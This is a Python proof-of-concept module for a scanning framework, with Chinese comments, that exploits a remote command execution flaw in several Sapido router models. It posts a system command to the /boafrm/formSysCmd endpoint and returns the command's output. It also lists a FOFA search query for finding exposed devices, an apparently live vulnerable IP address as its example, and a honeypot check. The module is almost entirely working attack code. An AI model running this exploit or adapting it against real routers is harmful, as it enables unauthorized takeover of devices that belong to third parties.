# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import re
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "hansi && jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-10",        # POC创建时间
        "UpdateDate" : "2022-01-10",        # POC创建时间
        "PocDesc" : """
            v1:略  
            v2:该版本对输出做了一定的优化，更简洁
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Sapido BRC70n路由器远程代码执行漏洞",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",  		   # 漏洞应用名称
        "AppVersion" : """
            BR270n-v2.1.03,
            BRC76n-v2.1.03,
            GR297-v2.1.3,
            RB1732-v2.0.43
        """,  # 漏洞应用版本
        "VulnDate" : "2022-01-10",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            
        """,                                # 漏洞简要描述

        "fofa-dork":"""
	        app="sapido-路由器"
        """,                     # fofa搜索语句
        "example" : "http://122.116.238.251:1080",      # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/boafrm/formSysCmd" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        data = "sysCmd=ifconfig&apply=Apply&submit-url=%2Fsyscmd.htm&msg="
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,headers = headers , data=data,proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code ==200 and "Link encap:Ethernet" in req.text:

                result = req.text.split("wrap=\"virtual\">")[1].split("</textarea>")[0]

                vuln = [True,result]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()

